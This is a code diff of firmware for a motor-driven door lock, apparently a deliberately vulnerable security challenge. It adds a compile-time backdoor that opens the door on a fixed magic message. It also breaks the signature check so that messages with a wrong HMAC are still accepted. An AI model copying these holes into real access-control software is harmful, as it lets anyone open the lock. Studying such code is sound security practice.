@@ -1,11 +1,14 @@
 #include "stm32f1xx_hal.h"
 
 #include "base64.h"
+#include "deserialize.h"
 #include "hardware.h"
 #include "hmac.h"
 #include "motor.h"
 #include "sha256.h"
-#include "sleep.h"
+#include "time.h"
+
+#define WITH_BACKDOOR 1
 
 static void cpp_main_in_cpp();
 static void open_door(StepperMotor &motor);
@@ -19,6 +22,19 @@ static void open_door(StepperMotor &motor) {
     // TODO: find the correct number which does a quarter or so backrotation
     motor.rotate(2000000, 1000000 * 4);
     motor.set_mode(0);
+}
+
+static bool check_info(const uint8_t *info, uint32_t info_size) {
+    while (info_size) {
+        if (*info < 0x20 || *info >= 0x7f) {
+            // illegal character in info string
+            return false;
+        }
+
+        info++;
+        info_size -= 1;
+    }
+    return true;
 }
 
 static void cpp_main_in_cpp() {
@@ -58,8 +74,10 @@ static void cpp_main_in_cpp() {
             (message->buf[6] == 'o') &&
             (message->buf[7] == 'r')
         ) {
-            open_door(motor);
             // nothing to see here
+#if WITH_BACKDOOR
+            open_door(motor);
+#endif
             continue;
         }
 
@@ -76,13 +94,66 @@ static void cpp_main_in_cpp() {
             continue;
         }
 
-        SHA256 digest;
-        digest.update(SECRET, sizeof(SECRET));
-        digest.update(message->buf.data() + HMAC_SIZE, size - HMAC_SIZE);
+        SHA256 hash;
+        hash.update(SECRET, sizeof(SECRET));
+        hash.update(message->buf.data() + HMAC_SIZE, size - HMAC_SIZE);
+        uint8_t digest[32];
+        hash.calculate_digest(digest);
+        for (uint32_t i = 0; i < HMAC_SIZE; i++) {
+            if (digest[i] != message->buf[i]) {
+                // the HMAC signature is wrong
+                continue;
+            }
+        }
 
-        if (!digest.equals(message->buf, HMAC_SIZE)) {
-            // the HMAC is wrong
+        // looks like the message is valid.
+        // check its type.
+
+        switch (message->buf[HMAC_SIZE]) {
+        case 0x01: {
+            // this message consists of:
+            //    uint8_t   type            = 0x01
+            //    uint64_t  valid_from
+            //    uint64_t  valid_until
+            //    char *    info            (variable length)
+
+            if (size < HMAC_SIZE + 17) {
+                // the message is too small.
+                continue;
+            }
+
+            uint64_t valid_from = deserialize_u64(&message->buf[HMAC_SIZE + 1]);
+            uint64_t valid_until = deserialize_u64(&message->buf[HMAC_SIZE + 9]);
+
+            uint64_t current_timestamp = get_timestamp();
+
+            if (valid_from > current_timestamp) {
+                // token is not yet valid
+                continue;
+            }
+            if (valid_until < current_timestamp) {
+                // token is no longer valid
+                continue;
+            }
+
+            uint8_t *info = &message->buf[HMAC_SIZE + 17];
+            uint32_t info_size = size - HMAC_SIZE - 17;
+            if (!check_info(info, info_size)) {
+                // info is not valid
+                continue;
+            }
+
+            // it seems like you're in luck.
+            open_door(motor);
+
+            break;
+        }
+        default: {
+            // unknown message type
             continue;
+
+            break;
+        }
         }
     }
 }
